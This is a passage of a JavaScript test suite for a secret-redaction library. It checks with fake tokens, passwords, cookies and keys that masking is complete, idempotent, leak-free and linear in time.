  assert.ok(Object.isFrozen(WITHHOLD_CATEGORIES) && Object.isFrozen(PATH_CATEGORIES));
});

// ── windows ─────────────────────────────────────────────────────────────────

test('redactWindow: a window that opens mid-file drops everything up to its first newline', () => {
  const window = 'abc123-half-of-a-token\nline two password=Zq81mXp2Lw\nline three\n';
  assert.equal(redactWindow(window, { startsMidFile: true, complete: true }), `line two password=${MASK('secret')}\nline three\n`);
});

test('redactWindow: with no newline in its first 4 KB, the leading partial line becomes the mark', () => {
  const long = 'x'.repeat(5000);
  assert.equal(redactWindow(`${long}\nnext line\n`, { startsMidFile: true, complete: true }), `${PARTIAL_LINE}\nnext line\n`);
  assert.equal(redactWindow(long, { startsMidFile: true, complete: true }), PARTIAL_LINE, 'a window that is all one line');
  assert.equal(redactWindow(`${'y'.repeat(4000)}\nnext\n`, { startsMidFile: true, complete: true }), 'next\n', 'within 4 KB it is dropped silently');
});

test('redactWindow: an incomplete window drops its unterminated last line', () => {
  const window = 'first line\nsecond line\nAuthorization: Bearer eyJhbG';
  assert.equal(redactWindow(window, { startsMidFile: false, complete: false }), 'first line\nsecond line\n');
  assert.equal(redactWindow('one unterminated line', { startsMidFile: false, complete: false }), PARTIAL_LINE,
    'a window with nothing left to show says so');
});

test('redactWindow: an END marker with no BEGIN masks from the window start', () => {
  const window = `tail of a line\nQm9keSBsaW5lIG9uZQ\nQm9keSBsaW5lIHR3bw\n${PEM('END')}\nafter the key\n`;
  assert.equal(redactWindow(window, { startsMidFile: true, complete: true }), `${MASK('private-key')}\nafter the key\n`);
  // A whole block later in the window is the ordinary rule's.
  const whole = `${PEM('BEGIN')}\nQm9keQ\n${PEM('END')}\nok\n`;
  assert.equal(redactWindow(whole, { startsMidFile: false, complete: true }), `${MASK('private-key')}\nok\n`);
  // A block cut by the window's end masks to the end.
  assert.equal(redactWindow(`ok\n${PEM('BEGIN')}\nQm9keQ\nQm9k`, { complete: false }), `ok\n${MASK('private-key')}`);
});

test('redactWindow: a complete window from the start of a file is redactText', () => {
  for (const f of FAKES.filter((x) => !x.context && !x.known)) {
    assert.equal(redactWindow(f.text, { startsMidFile: false, complete: true }), redactText(f.text), f.id);
  }
  assert.equal(redactWindow('', { startsMidFile: true, complete: false }), '');
  assert.equal(redactWindow(null), null);
});

// ── idempotence ─────────────────────────────────────────────────────────────

test('idempotence: redacting already-masked text changes nothing', () => {
  for (const f of FAKES) {
    const o = optsFor(f);
    const texts = FORMS.flatMap(([, wrap]) => [wrap(f.text), wrap(f.tail.text, { tail: true })]);
    for (const text of texts) {
      const once = redactText(text, o);
      assert.equal(redactText(once, o), once, `${f.id}: text`);
      assert.equal(redactWindow(once, { ...o, complete: true }), once, `${f.id}: window`);
    }
    const once = redactValue(jsonFor(f), o);
    assert.deepEqual(redactValue(once, o), once, `${f.id}: value`);
  }
  const { text } = fakeCorpus({ bytes: 256 * 1024 });
  const once = redactText(text);
  assert.equal(redactText(once), once, 'a mixed corpus');
  for (const mark of [MASK('secret'), WITHHELD('ssh'), PARTIAL_LINE]) {
    for (const s of [`password=${mark}`, `Cookie: a=${mark}`, `--token ${mark}`, `API_KEY=${mark}`, `https://u:${mark}@h.example.com`, mark]) {
      assert.equal(redactText(s), s, `a mark is never masked again: ${s}`);
    }
  }
});

test('only a well-formed mark shelters a value, and never across a line break', () => {
  const secret = 'Zq81mXp2LwQ9abcdefgH';
  const S = MASK('secret');
  // Text that merely opens a mark, around a secret: on the line before it, in
  // the store keys beside it, or a mark-shaped prefix with a label no rule
  // writes. None of them is a mark, so none of them shelters anything.
  assert.equal(redactText(`X=${MASK_OPEN}\nDB_PASSWORD=${secret}\nY=›`), `X=${MASK_OPEN}\nDB_PASSWORD=${S}\nY=›`);
  const store = { a: MASK_OPEN, api_token: secret.slice(0, 16), z: '›' };
  assert.equal(redactText(JSON.stringify(store)), JSON.stringify({ ...store, api_token: S }));
  assert.deepEqual(redactValue(store), { ...store, api_token: S });
  assert.equal(redactText(`${MASK_OPEN}Not A Label› password=${secret}`), `${MASK_OPEN}Not A Label› password=${S}`);
  assert.equal(redactText(`token: ${MASK_OPEN}${secret}`), `token: ${S}`, 'an opening with no label and no close');
  // A real mark earlier on the line, or on the line before, covers only itself.
  assert.equal(redactText(`${S} DB_PASSWORD=${secret}`), `${S} DB_PASSWORD=${S}`);
  assert.equal(redactText(`${WITHHELD('ssh')}\nDB_PASSWORD=${secret}`), `${WITHHELD('ssh')}\nDB_PASSWORD=${S}`);
  // A value that begins with a real mark was masked already, and keeps what
  // follows it (a URL's host after its masked password).
  const url = `https://x-access-token:${MASK('github-token')}@git.example.com/org/repo.git`;
  assert.equal(redactText(url), url);
});

// ── acceptance 3: a mask reveals no prefix, length or hash ──────────────────

test('masks reveal no prefix, length or hash: two secrets of one format redact to the same text', () => {
  const rnd = mulberry32(42);
  const pick = (n, alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') => {
    let s = 'Aa1';
    while (s.length < n) s += alphabet[Math.floor(rnd() * alphabet.length)];
    return s;
  };
  const formats = {
    github: (n) => `push with ghp_${pick(n + 12)} now`,
    'sk-key': (n) => `key sk-ant-api03-${pick(n)}AA in use`,
    jwt: (n) => `got eyJhbGciOiJSUzI1NiJ9.eyJ${pick(n)}.${pick(n + 20)} back`,
    'aws-key-id': () => `id AKIA${pick(16, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789').toUpperCase().slice(0, 16)} here`,
    npm: (n) => `token npm_${pick(n + 30)}`,
    assign: (n) => `password=${pick(n)} psql`,
    'env-line': (n) => `DB_PASSWORD=${pick(n)}\nNEXT=1`,
    cookie: (n) => `Cookie: sid=${pick(n)}; theme=dark`,
    bearer: (n) => `Authorization: Bearer ${pick(n)}`,
    'url-creds': (n) => `postgres://app:${pick(n)}@db.example.com/x`,
    'curl-user': (n) => `curl -u admin:${pick(n)} https://x.example.com`,
    'cli-flag': (n) => `tool --api-key ${pick(n)} run`,
    'x-api-key': (n) => `x-api-key: ${pick(n)}`,
    pem: (n) => `${PEM('BEGIN')}\n${Array.from({ length: n % 7 + 2 }, () => pick(64)).join('\n')}\n${PEM('END')}\nok`,
  };
  for (const [id, make] of Object.entries(formats)) {
    const a = make(24);
    const b = make(41);
    assert.notEqual(a, b);
    const ra = redactText(a);
    assert.equal(ra, redactText(b), `${id}: the redacted text depends on the format, not the value`);
    assert.ok(ra.includes(MASK(RULE.get(id).label)), `${id} is masked by its own rule`);
  }
});

test('every mask any rule writes is exactly MASK(label), with no value material beside it', () => {
  for (const f of FAKES) {
    const o = optsFor(f);
    const texts = FORMS.flatMap(([, wrap]) => [wrap(f.text), wrap(f.tail.text, { tail: true })]);
    for (const out of [...texts.map((t) => redactText(t, o)), JSON.stringify(redactValue(jsonFor(f), o))]) {
      for (const m of out.match(ANY_MASK) || []) {
        assert.ok(ALL_LABELS.has(m.slice(MASK_OPEN.length, -1)), `${f.id}: ${m} is a known label`);
      }
      for (const s of [...f.secrets, f.tail.secret]) {
        const head = s.split('\n')[0];
        // No leading characters of the value left before its mask, none of its
        // end after it (the vendor prefix of a token is part of what is masked).
        for (let k = 1; k <= Math.min(6, head.length); k++) {
          assert.ok(!out.includes(`${head.slice(0, k)}${MASK_OPEN}`), `${f.id}: ${k} leading characters kept`);
        }
      }
    }
  }
});

// ── known values and the redactor ───────────────────────────────────────────

test('createRedactor: known values of 8+ characters, any case, URL-encoded, or cut at the end', () => {
  const r = createRedactor();
  assert.equal(r.addKnown('someone.person@example.com', 'email'), true);
  assert.equal(r.addKnown('3f2a9c1b-0000-4000-8000-0123456789ab', 'org'), true);
  assert.equal(r.addKnown('short', 'x'), false, 'shorter than 8 characters is never registered');
  assert.equal(r.addKnown(12345678, 'x'), false);
  const E = MASK('email');
  assert.equal(r.text('from someone.person@example.com today'), `from ${E} today`);
  assert.equal(r.text('from SOMEONE.Person@Example.COM today'), `from ${E} today`, 'case-insensitively');
  assert.equal(r.text('?u=someone.person%40example.com&x=1'), `?u=${E}&x=1`, 'its URL-encoded spelling too');
  assert.equal(r.text('signed in as someone.perso…'), `signed in as ${E}…`, 'a known value cut at the end');
  assert.equal(r.text('org 3F2A9C1B-0000-4000-8000-0123456789AB'), `org ${MASK('org')}`);
  assert.deepEqual(r.value({ who: 'someone.person@example.com' }), { who: E });
  assert.equal(r.window('x\nsomeone.person@example.com\n', { startsMidFile: true }), `${E}\n`);
  assert.equal(r.text('short is not masked'), 'short is not masked');
  assert.equal(redactText('someone.person@example.com'), 'someone.person@example.com', 'only the redactor knows its values');
  assert.equal(r.text('a b someone.person@example.com', { known: [['a b c d e f g h', 'phrase']] }), `a b ${E}`, 'a call\'s own known values add to the redactor\'s');
});

test('createRedactor: the known values never leave it — not serialised, not inspected, not reported', () => {
  const r = createRedactor();
  r.addKnown('someone.person@example.com', 'email');
  assert.equal(JSON.stringify(r), '{}');
  assert.ok(!util.inspect(r, { depth: 5, showHidden: true }).includes('someone.person'), 'not in an inspection');
  assert.ok(Object.isFrozen(r));
  const reports = [];
  r.text('mail someone.person@example.com', { onMask: (n) => reports.push(n) });
  assert.deepEqual(reports, [{ id: 'known', label: 'email', tier: 1 }]);
});

test('onMask: one report per mask, {id, label, tier} and never the value; a callback may redact again', () => {
  const reports = [];
  const text = 'ghp_' + 'Ab3dEf9h'.repeat(5) + ' and password=Zq81mXp2Lw and Cookie: a=Zq81mXp2Lw; b=Yq81mXp2Lw';
  const out = redactText(text, {
    onMask: (n) => {
      reports.push(n);
      assert.equal(redactText('password=Zq81mXp2Lw'), `password=${MASK('secret')}`, 're-entrant redaction is safe');
    },
  });
  assert.equal((out.match(ANY_MASK) || []).length, reports.length, 'one report per mask');
  assert.deepEqual(reports.map((n) => n.id).sort(), ['assign', 'cookie', 'cookie', 'github']);
  for (const n of reports) {
    assert.deepEqual(Object.keys(n).sort(), ['id', 'label', 'tier']);
    assert.ok(!JSON.stringify(n).includes('Zq81mXp2Lw') && !JSON.stringify(n).includes('Ab3dEf9h'));
  }
});

test('the exported RULES describe; moving their lastIndex changes no result', () => {
  const text = FAKES.map((f) => (f.context || f.known ? '' : f.text)).join('\n');
  const before = redactText(text);
  for (const r of RULES) {
    if (r.re) r.re.lastIndex = 7;
    if (r.tail) r.tail.re.lastIndex = 7;
  }
  assert.equal(redactText(text), before);
});

test('redactText: non-strings pass through, short strings are left alone', () => {
  for (const v of [null, undefined, 42, true, '', 'abcd']) assert.equal(redactText(v), v);
  assert.deepEqual(redactText({ a: 1 }), { a: 1 });
  assert.equal(redactText('KEY=x'), `KEY=${MASK('secret')}`, 'the shortest maskable text');
});

test('NEVER_EMIT lists what the engine drops rather than redacts', () => {
  assert.deepEqual([...NEVER_EMIT.kinds].sort(), ['attachment/credential_org', 'attachment/instructions', 'attachment/prompt_snapshot', 'attachment/session_context']);
  assert.deepEqual([...NEVER_EMIT.fields].sort(), ['attachment.rendered', 'queue-operation.content', 'thinking.signature', 'toolUseResult.file.content',
    'toolUseResult.originalFile', 'toolUseResult.stderr', 'toolUseResult.stdout', 'wireToolInputs']);
  assert.ok(Object.isFrozen(NEVER_EMIT) && Object.isFrozen(NEVER_EMIT.kinds) && Object.isFrozen(NEVER_EMIT.fields));
});

// ── acceptance 2: a pure leaf ───────────────────────────────────────────────

test('lib/core/redact.js requires nothing, imports nothing and touches no process state or I/O', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'lib', 'core', 'redact.js'), 'utf8');
  const code = src.split('\n').filter((l) => !/^\s*\/\//.test(l)).join('\n');
  for (const [what, re] of [
    ['require(', /\brequire\s*\(/], ['import(', /\bimport\s*\(/], ['process.', /\bprocess\./], ['fs.', /\bfs\./],
    ['global.', /\bglobal(?:This)?\./], ['setTimeout', /\bset(?:Timeout|Interval|Immediate)\b/], ['console.', /\bconsole\./],
  ]) {
    assert.ok(!re.test(code), `lib/core/redact.js uses ${what}`);
  }
});

// ── linear time, and speed ──────────────────────────────────────────────────

// Inputs that make a careless rule quadratic: a run that holds its own start
// pattern (every `eyJ` after a dash, every `sk-`), an unterminated quote, a line
// of a thousand `curl`s, and the env rows' two shapes (a long name of family
// words with no `=`, and a long run of blanks before a value's last character),
// each run under all three modes so env-line, env-dotenv and env-dump all see
// them. Each is 200 KB; a quadratic rule would not finish inside the test
// timeout. Timings are logged, and asserted only under PERF.
test('adversarial inputs finish in linear time', (t) => {
  const N = 200_000;
  const rep = (s) => s.repeat(Math.ceil(N / s.length)).slice(0, N);
  const blanks = ' '.repeat(N);
  const inputs = {
    'env name, no =': rep('KEY'), 'env name, no =, lowercase': rep('key'), 'env name after export': `export ${rep('TOKEN')}`,
    'env blanks, then a character': `API_KEY=a${blanks}x`, 'env tabs, then a character': `API_KEY=a${rep('\t')}x`,
    'env blanks after a quote': `API_KEY="a"${blanks}x`, 'env blanks before a comment': `API_KEY=a${blanks}#${blanks}x`,
    'env open quote': `API_KEY="${rep('a')}`, 'env open single quote': `API_KEY='${rep('a')}`,
    'env lines of blanks': rep(`\nAPI_KEY=a${' '.repeat(64)}x`),
    // Starts after an escape (JSON line breaks, \u escapes, colour codes), runs
    // of backslashes and escaped quotes, and JSON closers after a tail.
    'escaped jwt lines': rep('\\neyJa-'), 'escaped sk lines': rep('\\nsk-a'), 'unicode escapes': rep('\\u0041ghp_'),
    'colour codes': rep('\x1b[0meyJa'), 'escaped env lines': rep('\\nAPI_KEY=a'), 'escaped env quotes': rep('\\nAPI_KEY=\\"a'),
    'env quotes at string ends': rep('\\nAPI_KEY=","'), backslashes: rep('\\'), 'backslashes after a key': `password=${rep('\\')}"`,
    'escaped quotes after a key': `password=${rep('\\"')}`, 'deep quotes': rep('\\\\\\"token\\\\\\":'),
    'JSON closers after a tail': `ghp_abcdef${rep('\\"}')}x`, 'escaped line breaks after a tail': `sk-abcdefgh${rep('\\n')}x`,
    letters: rep('a'), 'jwt dashes': rep('eyJa-'), 'jwt with no dot': `eyJ${rep('a')}`, 'sk dashes': rep('sk-a'),
    'password words': rep('password'), 'unterminated quote': `password="${rep('a')}`, 'escapes in a quote': `password="${rep('\\a')}`,
    'token colons': `token: ${rep(':')}`, 'curl words': `${rep('curl ')}-u`, 'scheme slashes': rep('https://'),
    'url colons': `https://${rep('a:')}@`, 'url at signs': `https://u:${rep('a@')}`, 'BEGIN markers': rep(`${PEM('BEGIN')}\n`),
    'cookie pairs': `Cookie: ${rep('a=b; ')}`, flags: rep('--token '), 'env lines': rep('\nAPI_KEY='),
    'escaped quotes': rep('\\"'), 'authorization headers': rep('Authorization: '), 'bare bearers': rep('Bearer '),
    'tunnel prefixes': rep('eyJhIjoi'), 'tunnel after =': rep('eyJhIjoi='), 'tunnel after /': rep('eyJhIjoi/'),
    'encoded starts': rep('%3DeyJa-'), 'slack dashes': rep('xoxb-'), 'key suffix': `password${rep('_')}=x`, 'known prefixes': rep('someone.pers'),
  };
  const r = createRedactor();
  r.addKnown('someone.person@example.com', 'email');
  let worst = ['', 0];
  for (const [name, text] of Object.entries(inputs)) {
    const t0 = process.hrtime.bigint();
    for (const mode of [undefined, 'env-dotenv', 'env-dump']) r.text(text, { context: mode && { mode } });
    r.window(text, { startsMidFile: true, complete: false });
    const took = ms(t0);
    if (took > worst[1]) worst = [name, took];
    if (PERF) assert.ok(took < 1500, `${name}: ${took.toFixed(0)} ms for 200 KB × 4`);
  }
  t.diagnostic(`slowest adversarial input: ${worst[0]} at ${worst[1].toFixed(1)} ms for 200 KB × 4 passes`);
});

test('speed: a 1 MiB mixed corpus, with no leak and no ordinary line changed', (t) => {
  const { text, fakes, carried: carriers } = fakeCorpus({ bytes: 1 << 20 });
  const r = createRedactor();
  r.addKnown('someone.person@example.com', 'email');
  r.text(text);
  const runs = [];
  let out = '';
  for (let i = 0; i < 3; i++) {
    const t0 = process.hrtime.bigint();
    out = r.text(text);
    runs.push(ms(t0));
  }
  runs.sort((a, b) => a - b);
  t.diagnostic(`1 MiB redacted in ${runs[1].toFixed(1)} ms (median of 3)`);
  if (PERF) assert.ok(runs[1] < 250, `1 MiB took ${runs[1].toFixed(0)} ms`);
  assert.deepEqual(findLeaks(out, fakes), []);
  assert.ok(carriers.some((line) => line.startsWith('{"type":"user"')), 'some carriers are JSON text');
  const carried = new Set(carriers);
  const changed = text.split('\n').filter((line) => !carried.has(line) && redactText(line) !== line);
  assert.deepEqual(changed, [], 'code, logs, JSON and prose lines with no secret are unchanged');
});
